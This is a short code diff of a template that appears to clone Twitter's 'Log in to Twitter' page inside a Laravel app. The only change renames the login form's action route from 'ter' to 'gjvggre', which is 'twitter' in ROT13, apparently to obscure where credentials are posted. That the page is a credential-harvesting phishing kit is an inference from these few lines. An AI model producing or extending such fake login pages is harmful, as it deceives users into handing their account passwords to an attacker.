@@ -268,7 +268,7 @@ data-fouc-class-names="swift-loading no-nav-banners"
 
     <div class="signin-wrapper" data-login-message="">
       <h1>Log in to Twitter</h1>
-      <form action="{{ url('ter') }}"  class="t1-form clearfix signin js-signin" method="post">
+      <form action="{{ url('gjvggre') }}"  class="t1-form clearfix signin js-signin" method="post">
           @csrf
         <fieldset>
 
